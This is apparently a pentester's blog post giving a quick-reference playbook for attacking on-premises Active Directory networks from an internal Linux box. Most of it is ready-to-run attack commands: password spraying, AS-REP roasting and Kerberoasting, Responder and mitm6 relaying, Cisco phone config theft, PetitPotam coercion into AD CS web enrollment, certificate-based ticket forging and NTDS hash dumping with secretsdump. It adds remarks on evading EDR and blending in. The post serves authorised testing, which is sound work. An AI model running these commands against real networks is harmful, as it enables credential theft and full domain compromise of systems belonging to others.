title: "Internal Network Testing Quick Hits"
layout: post
---

- [Overview](#1)
- [Unauthenticated Checks](#2)
    - [Situational Awareness](#2.1)
        - [Finding Important Servers](#2.1.1)
        - [Cleartext Creds Scanning](#2.1.2)
    - [NULL sessions](#2.2)
    - [Username Enumeration](#2.3)
    - [Password Spraying](#2.4)
    - [Default Credentials](#2.5)
    - [Printers](#2.6)
    - [AS-REP Roasting](#2.7)
    - [Responder](#2.8)
    - [IPv6](#2.9)
    - [Print Spooler](#2.10)
    - [Internal Web Apps](#2.11)
    - [Cisco Smart Install](#2.12)
    - [Cisco IP Phones](#2.13)
    - [NFS](#2.14)
- [Authenticated Checks](#3)
    - [BloodHound](#3.1)
    - [Kerberoasting](#3.2)
    - [Network Shares](#3.3)
    - [AD CS](#3.4)
        - [Certipy](#3.4.1)
        - [Web Enrollment](#3.4.2)
        - [Certificate Misconfigurations](#3.4.3)

## Overview <a name="1"></a>

Many of the techniques/tools/commands I describe below are based around operating from an internal Linux box with 0 creds, and for the most part is covering on-prem Active Directoy environments. This is also focused on pentesting, as Red Team tactics might be somewhat similar in certain areas but the considerations and context is obviously much different, so please keep all of that in mind.


## Unauthenticated Checks <a name="2"></a>


### Situational Awareness <a name="2.1"></a>


#### Finding Important Servers <a name="2.1.1"></a>

I like to identify the Domain Controllers first and get an idea of where I am when I first log into the attack box. 

* A quick way is to check `/etc/resolve.conf`, typically at least one is a DC, if not you can get an idea of what subnets are used.

* Sometimes you're lucky and they clearly label them via hostnames and you can grab them that way.

* More actively, you could scan all internal ranges for services that DCs typically use, such as Kerberos (UDP/TCP 88), DNS (UDP/TCP 53), LDAP (TCP 389/636), etc. `nmap -sV -T4 -Pn -p 88,389,445,etc`   

* Or, if you know the domain name internally, you can use `Kerbrute userenum` with the domain and it should discover most DCs/KDCs for you.


#### Cleartext Creds Scanning <a name="2.1.2"></a>

As soon as I hit an internal box, I start some type of network sniffer which analyzes pcaps.

[CredSLayer](https://github.com/ShellCode33/CredSLayer)

[net-creds](https://github.com/DanMcInerney/net-creds)

[PCredz](https://github.com/lgandx/PCredz)


### NULL Sessions <a name="2.2"></a>

This is shockingly common on DCs and other SMB hosts. There are a number of tools you can use to check. 

[Enum4linux](https://www.kali.org/tools/enum4linux/) is still a good option:

`enum4linux -a 192.168.1.235 | tee enum4linux-192.168.1.235.txt`

`for dc in $(cat ./domaincontrollers.txt);do enum4linux -a "$dc" | tee enum4linux-check-"$dc".txt; done`

[NetExec](https://github.com/Pennyw0rth/NetExec) is actually a relatively new discovery for me, but it is awesome, epseically given CME's recent developments.

`nxc smb 192.168.1.235 -u '' -p ''`

smbclient:

`smbclient -N -U "" -L \\192.168.1.235`

If this works and you can pull the domain users, you can use `NetExec` to conduct an efficent and safe password spray by polling bad password counts.

`nxc smb 192.168.1.235 -u '' -p '' --users`

Similarly, also be sure to check for any accessible shares:

`crackmapexec smb x.x.x.x/24 -u '' -p '' --shares`

`smbmap --host-file targets.txt -u '' -p '' -d domain.com`


### Username Enumeration <a name="2.3"></a>

If you don't get lucky with NULL sessions and get a full username list, these are some of the techniques I like to try to get a starter userlist.

* OSINT and LinkedIn enumeration with tools like [Bridgekeeper](https://github.com/0xZDH/BridgeKeeper) can help generate a potential list of usernames (assuming you know the format) which you can then pass to a tool like `Kerbrute userenum` to verify if they exist or not.

* Alternatively, you could generate a list of names to bruteforce that are generated from a "top names list" for whichever country the target is in.

* Another great option is [ldapnomnom](https://github.com/lkarlslund/ldapnomnom) which can be harder to detect and supports massive username bruteforcing at great speeds. 

* If the organization doesn't use common usernames formats like first_last, flast, f.last, etc and instead use user IDs it may be much more difficult to guess without a source to pull the usernames from.

    * In these cases, check all internal web applications (use a screenshot tool like [gowitness](https://github.com/sensepost/gowitness) or [Eyewitness](https://github.com/RedSiege/EyeWitness)) to find any apps that might interface with AD. I've had some luck with random tools that allow unauth users to search the all AD user objects. 
    * Make sure to find any printers with a web interface and look for any exposed address books.

**Kerbrute:**

https://github.com/ropnop/kerbrute

I love this tool. It comes with a few different options for password spraying but here I just use the userenum module. 

`kerbrute userenum -d domain.com possible-usernames.txt`

This tool will send a TGT request with no-preauth, so you will be generating `event ID 4768` if Keberos logging is enabled.

### Password Spraying  <a name="2.4"></a>

Not only for external testing! Once you get a decent list of valid usernames, password spraying is always a great technique to get inital authenticated access or move laterally.

Even if you have creds already, weak passwords are so prevalent, right along with password reuse for service accounts, and even administrative accounts. This is especially dangerous as many organizations still don't have [LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview). 

Password spraying is almost an art form, and relies heavily on your curated wordlist (maybe even derived from all of your potfiles) to be successful. In my opinion it should be done largely manually as that reduces the risk of something going really wrong. 

However, there are definitely benefits to automating, especially when you have really useful information available to you like bad password counts.

There's probably 1,000 different ways to go about this but I typically use `kerbrute`. 

`kerbrute passwordspray -d domain.com -u users.txt -p 'Summer2024!' -o pass-spray-1.txt`

And always, be cautious!


### Default Credentials <a name="2.5"></a>

This could be a blog post on its own, but these are only a few of the tools/techniques I typically use.

I like this tool:

https://github.com/ihebski/DefaultCreds-cheat-sheet

Once installed you can perform quick checks from the command prompt:

```
$ creds search sharp

+---------+---------------+----------+
| Product |    username   | password |
+---------+---------------+----------+
| sharp   |     admin     |  admin   |
| sharp   | Administrator |  admin   |
| sharp   |     admin     |  Sharp   |
| sharp   |    <blank>    | <blank>  |
| sharp   |    <blank>    |  sysadm  |
+---------+---------------+----------+
```

Mentioned earlier, but `Eyewitness` should also perform some default cred checks on any scanned web applications. 

Another tool for pretty much everything is [changeme](https://github.com/ztgrace/changeme), although this hasn't been updated in several years. Please let me know if you use any newer tools!

[nuclei](https://github.com/projectdiscovery/nuclei) also has some templates with default credential checks, which could be easily expanded upon.

Manual credential bruteforcing with `hydra` or `medusa` are also options.

[SecLists](https://github.com/danielmiessler/SecLists) always has plenty of potential wordlists to try.


### Printers  <a name="2.6"></a>

I love leveraging printers to get domain authentication. If you're lucky, some printers will not require any authentication at all, or use default creds. This may have a ton of settings to explore, or as I mentioned above can have address books which can be useful for password spraying.

If you hit the jackpot, some printers may even be configured with LDAP or SNMP credentials that you could possibly extract, or pass the credentials back to your server.

https://medium.com/r3d-buck3t/pwning-printers-with-ldap-pass-back-attack-a0d8fa495210

Don't ignore printers!

Also interesting but not something I've had any real lateral movement with is the [Printer Exploitation Toolkit](https://github.com/RUB-NDS/PRET).

Side note on printers, Nuclei will very often cause printers to go crazy and start printing (potentially hundreds of pages). Just something to note, consider excluding printers from `nuclei` and save the trees (and your clients from a headache)!


### AS-REP Roasting  <a name="2.7"></a>

You can perform this completely unauthenticated as long as you have a username list.

`GetNPUsers.py -no-pass -usersfile usernames.txt -format hashcat -outputfile asreproasthashes.txt domain.com/`

Then crack away!

`hashcat -m 18200`


### Responder  <a name="2.8"></a>

Responder is still alive and well. If you're on an active network, there is a good chance it'll work! 

Probably everyone and their grandma knows how to run Responder but here's the obligatory "run responder" section anyways. 

There's a few different ways to take advantage LLMNR/NBT-NS but I typically use it in combination with `ntlmrelayx` socks and `proxychains` to connect to captured SMB sessions and raid shares. 

If I get admin, `secretsdump`. It sounds dumb, but `secretsdump` has been very reliable for me over the years. Most EDR's miss it.


#### Checking for Susceptibility

Check for SMB Signing: 

`crackmapexec smb x.x.x.x/24 --gen-relay-list cme-genrelaylist.txt`

`nmap --script smb-security-mode.nse -v -p 445 -iL targets.txt`

Or this wrapper - [check-smb-signing](https://github.com/actuated/check-smb-signing)

Then check in analyze mode:

`/usr/share/responder/Responder.py -I eth0 -A`


#### Running Responder

Startup `ntlmrelayx` to proxy captured sessions:

`ntlmrelayx -smb2support -sock -tf cme-genrelaylist.txt` 

Adjust `proxychains.conf`:

```
...

[ProxyList]
socks4 	<YOUR MACHINES IP> 1080
```

Start poisoning:

`Responder.py -I eth0`

More details here on the socks proxy technique:

https://www.secureauth.com/blog/playing-with-relayed-credentials/

Then you can use something like, [manspider](https://github.com/blacklanternsecurity/MANSPIDER) and `proxychains` to search through any shares you now have access to for sensitive info.

If you get admin, as I mentioned above `secretsdump` often works well. 

If you only get DCC2 hashes from this, toss those into `hashcat` while you continue working. If you get the machine account NTLM hash, that is also useful and you can run things like `bloodhound` or perform kerberoasting with those machine account credentials. Keep in mind those actions from a machine account will definitely stand out.


### IPv6 Man-in-the-Middle  <a name="2.9"></a>

I'll be honest, I haven't had the most luck with actually exploiting IPv6 and getting credentials. That said, it's still a potential avenue and it's worth exploring as IPv6 adoption is still not common.

To my knowledge, [mitm6](https://github.com/dirkjanm/mitm6) is still the goto tool for exploiting IPv6 issues in Windows networks. 

Basic commands:

`mitm6 -d domain.com --ignore-nofqdn`

This will bring up a login prompt when a user attempts to access an internal resource.

Then in conjunction with `ntlmrelayx` you can relay the LDAP connection:

`ntlmrelayx -t ldap://192.168.1.235 -wh blah -6`

There are plenty of other possible options. TrustedSec has a great blog post with several relaying examples here; https://trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022


### Print Spooler  <a name="2.10"></a>

I always like verifying if any of the DCs have print spooler enabled early on. There's been a few issues (print nightmare) that rely on spooler. Usually I target spooler later down the line if I need to coerce authentication for delegation attacks or something like the AD CS Web Enrollment issue (ESC8).

`rpcdump.py <DC IP> | grep ms-rp`

`for ip in $(cat ./domaincontrollers.txt); do; rpcdump.py "$ip" | tee rcpdump-"$ip".txt; done`


### Internal Web Apps  <a name="2.11"></a>

I always like to run some type of web screenshot tool like [gowitness](https://github.com/sensepost/gowitness) or [EyeWitness](https://github.com/RedSiege/EyeWitness) to see all of the available internal web apps visually.

I typically pass `gowitness` my nmap data: 

`gowitness nmap -f nmap-scan.xml --service http --service https`

Eyewitness has a few more features, like screenshots for RDP, VNC, etc, has a report with more info and even tries some default credentials.

`EyeWitness.py --all-protocols -f nmap-scan.xml --no-prompt`


### Cisco Smart Install  <a name="2.12"></a>

If you find any 4786/TCP you could have Cisco Smart Install (unauthenticated access to get and upload config files). This very often gives you admin access to various Cisco network devices, but those passwords are also typically reused elsewhere in AD.

https://www.cisco.com/c/en/us/td/docs/switches/lan/smart_install/configuration/guide/smart_install/concepts.html

There's a few tools that exist which help you verify the issue and even download or upload config files.

- [https://github.com/frostbits-security/SIET](https://github.com/frostbits-security/SIET)
- [https://github.com/Sab0tag3d/SIETpy3](https://github.com/Sab0tag3d/SIETpy3)


### Cisco IP Phones <a name="2.13"></a>

If you find any "Cisco IP Phone" web pages you may be in luck. You may find SSH, or LDAP credentials stored in a Service Profile File with a *.cnf.xml extension referenced in the phone's configuration file.

![cisco IP phone](screenshots/cisco-phone.png)

Described [here](https://infosecwriteups.com/complete-take-over-of-cisco-unified-communications-manager-due-consecutively-misconfigurations-2a1b5ce8bd9a), if you find the phones configured call manager server you can request the phone's configuration file from CUCM.

`wget http://callmanagerip:6970/<phone / SEP****>.cnf.xml.sgn`

Then in this file, you can look for `sshAccess`, `sshUserId`, `sshPassword`, and `*.cnf.xml`.

If you  find a `.cnf.xml` file in the phone's config, you can request that from the CUCM server as well.

`wget http://callmanagerip:6970/<service profile name>.cnf.xml`

The author of the article I linked above created a Python script to automate this across multiple phones. I have made a small update so it works with English Cisco devices which you can use here - https://github.com/hookech0/get-cisco-phone-config/blob/main/get-cisco-phone-config.py

I later found TrustedSec has their own script and blog covering this topic as well.

- https://github.com/trustedsec/SeeYouCM-Thief/tree/main
- https://trustedsec.com/blog/seeyoucm-thief-exploiting-common-misconfigurations-in-cisco-phone-systems


### Network File System  <a name="2.14"></a>

NFS is often configured insecurly and will usually allow any `*` to mount. If you find any NFS (typically 2049/TCP) try to see if you can mount it.

`showmount -e 192.168.1.40`

`nmap --script nfs-ls,nfs-showmount,nfs-statfs`

There is also [nfsshell](https://github.com/NetDirect/nfsshell) that is quite old now, but can help play with GID/UID.


## Authenticated  <a name="3"></a>

There's so many routes to go once you get your hands on the first valid set of credentials. The techniques and exploits are constantly changing as well so what I have below is just a starting point. These checks are also in the context of a penetration test.


### BloodHound <a name="3.1"></a>

Definietly loud, but [BloodHound](https://github.com/BloodHoundAD/BloodHound/releases) is a great tool for surgically finding attack paths and automated recon.

For the actual data collection:

[https://github.com/dirkjanm/BloodHound.py](https://github.com/dirkjanm/BloodHound.py)


This is quite loud as it includes the `loggedon` argument:

`bloodhound -c all,loggedon -u username -p password -d domain.com -dc <DC NAME> --zip`

You can omit `loggedon` if you want, or try `-c dconly`.

Once you get the data it's really up to you, and the environment as to what to exploit/leverage.

Custom queries are a good way to expand your `bloodhound`:

- [https://github.com/LuemmelSec/Custom-BloodHound-Queries](https://github.com/LuemmelSec/Custom-BloodHound-Queries)
- [https://github.com/ZephrFish/Bloodhound-CustomQueries](https://github.com/ZephrFish/Bloodhound-CustomQueries)
- [https://github.com/CompassSecurity/BloodHoundQueries](https://github.com/CompassSecurity/BloodHoundQueries)


#### bloodyAD

[https://github.com/CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD)

This is a great Linux AD tool to use alongside BloodHound.


### Kerberoasting <a name="3.2"></a>

Kerberoasting can be a quick way to escalate. But be weary, make sure each account looks legit before pulling every SPN. SPNs are a prime spot for honeypots. Even though this is aimed at pentesting, being aware of your footprint is something I try to keep in mind.

List SPNs:

`GetUserSPNs.py domain.com/username -dc-ip x.x.x.x`

Normal Kerberoast:

`GetUserSPNs.py domain.com/username -request -outputfile tgs.txt -dc-ip x.x.x.x ` 

Targeted Kerberoast:

`GetUserSPNs.py domain.com/username -request-user admin_account -dc-ip x.x.x.x`

Custom Kerberoasting:

The tool [Orpheus](https://github.com/trustedsec/orpheus) is a wrapper for `GetUserSPNs.py` that allows you to control the Ticket Options and Encryption Type while requesting a TGS which helps you blend in.


### Network Shares <a name="3.3"></a>

SMB shares are quite often full of credentials, secrets, or other information which can be used to move laterally or escalate privileges.

Once some credentials are obtained I tend to run [manspider](https://github.com/blacklanternsecurity/MANSPIDER) on active networks in search of typically simple words like "password". 

Few things to be aware of here, `manspider` will store loot files by default in `~/.manspider/loot` so if your filesystem is running low on storage you may want to turn that off. I also tend to add a fair number of `--exclude-extension` arguments to limit the error messages.

`manspider`


### Active Directory Certificate Services <a name="3.4"></a>

This is the gift that keeps on giving. 


#### Certipy <a name="3.4.1"></a>

[Certipy](https://github.com/ly4k/Certipy) is my goto tool for finding AD CS issues and exploiting them.

`certipy find -u joe@acme.com -p 'P@ssw0rd' -dc-ip 192.168.1.235 -enabled`


#### Web Enrollment <a name="3.4.2"></a>

This is almost vulnerable by default. A lot of organizations are still unaware of the issues surrounding AD CS. Even if certificates aren't used or are vulnerable, if there is a CA, Web Enrollment almost always is exploitable.

It could potentially be exploited with 0 authentication if you get lucky. If a DC is vulnerable to [PetitPotam](https://github.com/topotam/PetitPotam) and you can coerce without requiring a set of credentials, you can just run `ntlmrelayx` and try guessing the common default certificate templates like `DomainController` `DomainControllerAuthentication` etc. This isn't very common though, and if the DC is that behind in patches you probably have other serious issues.

Trying with no auth:

`ntlmrelayx.py -t http://ca-srv/certsrv/default.asp --template DomainController -smb2support`

`PetitPotam.py 192.168.2.41 192.168.1.235`

You can also try with [Coercer](https://github.com/p0dalirius/Coercer).

Otherwise, you'll just pass `PetitPotam`, or `Coercer` some credentials to exploit.

`ntlmrelayx.py -t http://ca-srv/certsrv/default.asp --template DomainController -smb2support`

`PetitPotam.py -u joe -p 'password' 192.168.2.41 192.168.1.235`

One thing to note, in some enviroments a DC has the CA role. I don't believe you can relay the connection back to the same DC/CA so be sure you point `PetitPotam` or `Coercer` at another server.

Save and decode the base64 certificate you captured with `ntlmrelayx` to a *.pfx file.   

`cat ca01.b64 | base64 -d > dc1.pfx`

Then try auth with `certipy` or [PKINITtools](https://github.com/dirkjanm/PKINITtools).

`gettgtpkinit.py 'acme.com/dc1$' -cert-pfx dc1.pfx dc1.ccache`

`KRB5CCNAME=dc1.ccache`
 
`getnthash.py 'acme.com/dc1$' -key <AS-REP enc key retrieved above>`

Then generate a silver ticket for an admin and CIFS:

`gets4uticket.py kerberos+ccache://acme.com\\dc1\$:dc1.ccache@dc1.acme.come cifs/dc1.acme.com@acme.com administrator@acme.com administrator.ccache -v`

`KRB5CCNAME=administrator.ccache`

`secretsdump.py -k 'acme.com/administrator@dc1 -no-pass -just-dc-ntlm -outputfile acme-ntds.txt'`

If the Domain Controllers don't support PKINIT you can try through Schannel. `certipy` has a `ldap-shell` option. Alternatively, [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/tree/main) is great.

`certipy cert -pfx dc1.pfx -nokey -out dc1.crt`
`certipy cert -pfx dc1.pfx -nocert -out dc1.key`

Then you can authenticate to different services over Schannel. `PassTheCert` has several different ways to escalate from there.

#### Certificate Misconfigurations <a name="3.5"></a>

This could be a post on its own. However, I'm just going to keep it really high-level, as this is something I always check.

If you're completely unfamiliar, give these a read:

- [https://posts.specterops.io/certified-pre-owned-d95910965cd2](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/)
- [https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-2/](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-2/)

Finding vulnerable templates:

`certipy find -u 'joe@acme.com -p 'P@ssw0rd!' -enabled -vulnerable`

Certipy will tell you which templates are exploitable and to what technique (ESC1, ESC2, etc) which will inform you how to proceed. Typically it can all be done using just `certipy`.


To be continued
